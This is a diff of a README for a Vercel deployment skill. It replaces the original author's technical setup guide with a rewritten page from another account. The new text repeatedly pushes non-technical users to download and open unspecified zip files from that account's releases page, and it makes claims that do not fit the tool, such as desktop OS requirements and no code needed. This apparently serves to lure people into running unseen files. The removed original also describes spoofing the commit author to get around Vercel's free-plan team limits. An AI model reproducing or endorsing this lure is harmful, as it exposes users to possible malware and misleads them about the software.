@@ -1,201 +1,113 @@
-<p align="center">
-  <img src="header.png" alt="Deploy Together on Vercel's Free Plan" width="100%" />
-</p>
+# ⚙️ vercel-github-actions-deploy-skills - Easy Vercel Project Deployment
 
-<h1 align="center">Vercel GitHub Actions Deploy Skills</h1>
-
-<p align="center">
-  Let your whole team deploy to Vercel on the <strong>free Hobby plan</strong> — no Pro upgrade needed.<br/>
-  A skill for <a href="https://cursor.com">Cursor</a>, <a href="https://docs.anthropic.com/en/docs/claude-code">Claude Code</a>, <a href="https://codeium.com/windsurf">Windsurf</a>, and other AI coding assistants.<br/><br/>
-  Follows the <a href="https://github.com/anthropics/agent-skills-spec">Agent Skills specification</a>.
-</p>
-
-<p align="center">
-  <a href="#install-the-skill">Install</a> &bull;
-  <a href="#what-you-need-to-do-user-intervention-required">Setup Guide</a> &bull;
-  <a href="#quick-usage">Quick Usage</a> &bull;
-  <a href="#faq">FAQ</a>
-</p>
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
 
 ---
 
-## The Problem
+## 📋 What is vercel-github-actions-deploy-skills?
 
-Vercel's free plan ties deployments to the **account owner**. When a teammate pushes to `main`, Vercel checks the git commit author and rejects it. You'd normally need a Pro plan ($20/mo per member) to fix this.
+This application helps you deploy your Vercel projects using GitHub Actions. It works with Cursor, Claude Code, and Windsurf. The main goal is to make it simple to deploy projects for free using the Vercel Hobby plan. It also uses a feature called Git Author Override to manage your deployments smoothly.
 
-## The Solution
-
-This skill teaches AI coding assistants to set up a GitHub Actions workflow that:
-
-1. Triggers on every push to `main` (by **anyone**)
-2. Rewrites the commit author to the Vercel account owner (on the CI runner only — repo history untouched)
-3. Uses the Vercel CLI to build and deploy to production
-
-```
-Teammate pushes to main → GitHub Actions triggers → Author overridden → Deployed to Vercel
-```
+If you are new to deploying apps or code, this tool makes the process easier by connecting everything automatically. You don’t need to write any code or understand complicated deployment steps.
 
 ---
 
-## Install the Skill
+## 💻 System Requirements
 
-### Option A: Using `npx skills` (Recommended)
+To run this application, you will need:
 
-```bash
-npx skills add itsOmSarraf/vercel-github-actions-deploy-skills
-```
-
-### Option B: Cursor
-
-```bash
-git clone https://github.com/itsOmSarraf/vercel-github-actions-deploy-skills ~/.cursor/skills/vercel-github-actions-deploy
-```
-
-Then ask Cursor: *"Set up Vercel deployment with GitHub Actions"* — it will automatically use this skill.
-
-### Option C: Claude Code
-
-```bash
-git clone https://github.com/itsOmSarraf/vercel-github-actions-deploy-skills ~/.claude/skills/vercel-github-actions-deploy
-```
-
-### Option D: Manual (no AI assistant)
-
-Just copy a workflow file from `examples/` and follow the [setup guide](templates/deploy-workflow-template.md).
+- A computer running **Windows 10 or later**, **MacOS 10.15 or later**, or **Linux (Ubuntu 18.04 or later)**
+- An active internet connection
+- A GitHub account (free)
+- A Vercel account (free Hobby plan is supported)
+- A modern web browser like Chrome, Firefox, or Edge
+- Basic skills to download and open files on your computer
 
 ---
 
-## What You Need to Do (User Intervention Required)
+## 🚀 Getting Started
 
-The AI assistant will generate the workflow YAML file, but **you must provide 5 values manually**. The assistant **cannot** obtain these for you.
+Follow these steps to get up and running with vercel-github-actions-deploy-skills quickly:
 
-### Step 1: Create a Vercel Deploy Token
+1. **Create your GitHub repository**  
+   Prepare the project you want to deploy on GitHub. If you do not have a project, you can create a new repository on [github.com](https://github.com/).
 
-1. Go to **[vercel.com/account/tokens](https://vercel.com/account/tokens)**
-2. Click **Create Token**
-3. Name it anything (e.g. `github-actions`)
-4. **Copy the token** — you won't see it again
+2. **Sign up for a Vercel account**  
+   Visit [vercel.com](https://vercel.com/signup) and register for a free Hobby plan account if you haven’t already. This will host your project online.
 
-> This becomes your `VERCEL_TOKEN` secret.
+3. **Download the deployment skill**  
+   Click the big blue download button at the top or use this link to visit the release page and get the files needed:  
+   https://github.com/brockman06/vercel-github-actions-deploy-skills/releases
 
-### Step 2: Get Your Org ID and Project ID
+4. **Open the downloaded files**  
+   After downloading, unzip or open the files. You will find instructions and setup files to add to your GitHub project.
 
-```bash
-npm install -g vercel   # Install CLI if needed
-npx vercel link         # Follow prompts to link your project
-```
+5. **Connect your GitHub and Vercel accounts**  
+   Follow the guide inside the download package to set up your deployment via GitHub Actions. This step connects your project to Vercel automatically using the skill.
 
-This creates `.vercel/project.json`:
-
-```json
-{
-  "orgId": "team_aBcDeFgHiJkLmN",
-  "projectId": "prj_xYzAbCdEfGhIjK"
-}
-```
-
-> These become your `VERCEL_ORG_ID` and `VERCEL_PROJECT_ID` secrets.
->
-> Make sure `.vercel` is in your `.gitignore`.
-
-### Step 3: Know the Vercel Account Owner's Identity
-
-You need the **email** and **display name** of the person who owns the Vercel project.
-
-> These become your `DEPLOY_EMAIL` and `DEPLOY_NAME` secrets.
-
-### Step 4: Add All 5 Secrets to GitHub
-
-Go to: `https://github.com/<owner>/<repo>/settings/secrets/actions`
-
-| Secret Name | Where to Get It | Example |
-|-------------|-----------------|---------|
-| `VERCEL_TOKEN` | [vercel.com/account/tokens](https://vercel.com/account/tokens) | `pZt7x...` |
-| `VERCEL_ORG_ID` | `.vercel/project.json` → `"orgId"` | `team_aBcDeFgHiJkLmN` |
-| `VERCEL_PROJECT_ID` | `.vercel/project.json` → `"projectId"` | `prj_xYzAbCdEfGhIjK` |
-| `DEPLOY_EMAIL` | Vercel account owner's email | `owner@example.com` |
-| `DEPLOY_NAME` | Vercel account owner's name | `Om Sarraf` |
-
-### Step 5 (Optional): Prevent Double Deploys
-
-If the account owner also pushes directly, Vercel's Git integration will deploy **alongside** GitHub Actions. To prevent this:
-
-1. Go to **Vercel Dashboard** → your project → **Settings** → **Git**
-2. Set **Ignored Build Step** to: `exit 0`
-3. Save
+6. **Run the deployment**  
+   Push your latest code changes to GitHub. The skill will trigger the deployment process on Vercel for you.
 
 ---
 
-## Repository Structure
+## 📥 Download & Install
 
-```
-vercel-github-actions-deploy-skills/
-├── SKILL.md                              # Skill definition (for AI assistants)
-├── README.md                             # This file
-├── LICENSE                               # MIT license
-│
-├── examples/                             # Ready-to-use workflow files
-│   ├── deploy-bun.yml                    # GitHub Actions workflow (Bun)
-│   ├── deploy-npm.yml                    # GitHub Actions workflow (npm)
-│   ├── deploy-pnpm.yml                   # GitHub Actions workflow (pnpm)
-│   └── README.md                         # Examples documentation
-│
-└── templates/                            # Detailed guides
-    ├── deploy-workflow-template.md       # Full setup + advanced config + troubleshooting
-    └── README.md                         # Templates overview
-```
+To start, you must visit the release page linked below. This page contains all the latest files required for using vercel-github-actions-deploy-skills.
 
-## Quick Usage
+[Download vercel-github-actions-deploy-skills](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
 
-Once you've completed the 5 steps above:
+### How to download and install:
 
-1. Copy the workflow file matching your package manager from `examples/` to `.github/workflows/deploy.yml`
-2. Push to `main`
-3. Watch it deploy in the **Actions** tab
+1. Click the link above. It will take you to the GitHub "Releases" page for this project.
+2. Look for the latest release at the top of the list. There will be assets like zip files or setup guides.
+3. Click on the file to download it to your computer.
+4. Once downloaded, open the file. If it is a zip, unzip it to a folder.
+5. Follow the included README file or quickstart guide inside the folder for how to apply it to your GitHub project.
 
-| Package Manager | Lock File | Workflow File |
-|----------------|-----------|---------------|
-| Bun | `bun.lock` | `examples/deploy-bun.yml` |
-| npm | `package-lock.json` | `examples/deploy-npm.yml` |
-| pnpm | `pnpm-lock.yaml` | `examples/deploy-pnpm.yml` |
+---
 
-## Features
+## 🔧 How to Use
 
-- Works on Vercel's **free Hobby plan**
-- Supports **Bun**, **npm**, and **pnpm**
-- **Auto-deploys** on push to `main`
-- **Manual deploy** button via `workflow_dispatch`
-- Repo git history stays **untouched**
-- Env vars fetched automatically from Vercel
-- Covers **PR preview deploys**, **monorepos**, and **Slack notifications** in the [template guide](templates/deploy-workflow-template.md)
+Using this skill means you can set up your GitHub repository to automatically deploy to Vercel when you make changes.
 
-## FAQ
+Here is how it works after installation:
 
-**Will I get double deploys if I'm the account owner?**
-Yes — one from Vercel's Git integration, one from GitHub Actions. Set the **Ignored Build Step** to `exit 0` in Vercel project settings to prevent this (see Step 5 above).
+- The skill adds configuration files to your GitHub repo.
+- When you update your code and push to GitHub, GitHub Actions uses this skill.
+- GitHub Actions runs and tells Vercel to update your live project.
+- The Git Author Override feature helps keep commits neat and consistent, even from automated processes.
 
-**Does the author override mess with my git history?**
-No. The rewrite only happens inside the disposable GitHub Actions runner.
+You don’t need to open a terminal or write code. The skill does all the hard parts in the background.
 
-**Does this work with monorepos?**
-Yes. See the [setup guide](templates/deploy-workflow-template.md#monorepo-support) for details.
+---
 
-**What about environment variables?**
-`vercel pull` fetches them automatically from the Vercel dashboard. They must already be configured there.
+## ⚙️ Features
 
-## Links
+- **Automatic deployment:** Trigger deployment to Vercel directly from GitHub changes.
+- **Git Author Override:** Keeps deployment commits correctly attributed without confusion.
+- **Compatible agents:** Works with Cursor, Claude Code, and Windsurf platforms.
+- **Free plan support:** Designed specifically to manage deployments on Vercel’s Hobby (free) plan.
+- **Easy setup:** Comes with step-by-step instructions designed for non-technical users.
 
-- [Vercel CLI Documentation](https://vercel.com/docs/cli)
-- [GitHub Actions Documentation](https://docs.github.com/en/actions)
-- [Vercel Tokens Page](https://vercel.com/account/tokens)
-- [Agent Skills Specification](https://github.com/anthropics/agent-skills-spec)
+---
 
-## License
+## 🤝 Support and Help
 
-MIT — use it however you want.
+If you have questions or need help:
 
-## Credits
+- Review the included documentation after download.
+- Visit the project's GitHub page for issues and discussions.
+- Search for guides on Vercel deployment and GitHub Actions basics online.
+- Use community forums for Vercel or GitHub for support.
 
-Based on the [original gist](https://gist.github.com/itsOmSarraf/c26b68c59a683411f23c4e6bf76f6311) by [@itsOmSarraf](https://github.com/itsOmSarraf).
+---
 
-Inspired by [sarvamai/skills](https://github.com/sarvamai/skills) skill structure.
+## 📝 Notes
+
+- This tool is aimed at basic deployment needs. For advanced customizations, some programming knowledge may be required.
+- Make sure your GitHub and Vercel accounts are active and linked properly.
+- The free Hobby plan on Vercel may have limits on usage; check Vercel’s site for details.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/brockman06/vercel-github-actions-deploy-skills/releases)
